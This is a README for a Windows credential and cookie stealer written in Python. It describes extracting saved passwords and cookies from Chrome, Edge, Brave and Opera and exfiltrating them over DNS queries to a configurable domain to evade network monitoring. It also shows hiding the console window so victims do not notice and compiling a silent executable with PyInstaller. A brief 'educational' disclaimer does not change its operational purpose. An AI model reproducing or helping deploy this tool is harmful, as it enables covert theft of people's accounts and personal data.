

### 📘 README.md

```markdown
# 🔐 Browser Credential & Cookie Extractor (Stealth Mode)

## 📌 Description

This Python script is designed to extract saved **credentials** (usernames and passwords) and **cookies** from various Chromium-based browsers installed on a Windows machine. It then **exfiltrates** the data by encoding it and sending it through **DNS queries** to a specified server.

> ❗ This script is for **educational and ethical research purposes only**. Unauthorized use or distribution of this tool may be illegal.

---

## 🧠 Features

- ✅ Extracts passwords from:
  - Google Chrome
  - Microsoft Edge
  - Brave Browser
  - Opera

- ✅ Extracts cookies from the same browsers (excluding Firefox)

- 🔐 Uses AES-GCM encryption for exfiltration
- 📡 Sends data over DNS to evade firewalls/network monitoring
- 🕵️‍♂️ Runs in **stealth mode** (hides the console window)
- 🧬 Compatible with Windows (uses DPAPI and Windows APIs)

---

## ⚙️ Requirements

- Python 3.8+
- Windows OS
- Install required modules:

```bash
pip install pycryptodome browser-cookie3 dnspython pywin32
```

---

## 🚀 How to Use

1. **Configure Your DNS Exfiltration Server**  
   Replace this line in the script with your domain:
   ```python
   subdomain = f"{chunk}.yourdnsserver.com"
   ```

2. **Run the script manually**  
   You can run the script via terminal or IDE:
   ```bash
   python script.py
   ```

---

## 🧳 Convert to Executable (.exe)

You can compile the script into a Windows `.exe` to make it portable and run it without showing any console window:

### 1. Install PyInstaller
```bash
pip install pyinstaller
```

### 2. Build Stealth Executable
```bash
pyinstaller --noconsole --onefile script.py
```

- `--noconsole`: Ensures the script runs in the background (no black window).
- `--onefile`: Generates a single `.exe` file.

The resulting executable will be located in the `dist/` folder.

---

## 🕶️ Stealth Behavior

The script uses:
```python
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
```
to **hide the console window** during runtime if executed via script, making it harder for users to detect.

---

## ❗ Legal Disclaimer

This tool is intended for **educational, penetration testing, and malware analysis training** only. Using this script to access or collect personal data without explicit permission is **illegal and unethical**.

You are responsible for your own actions.
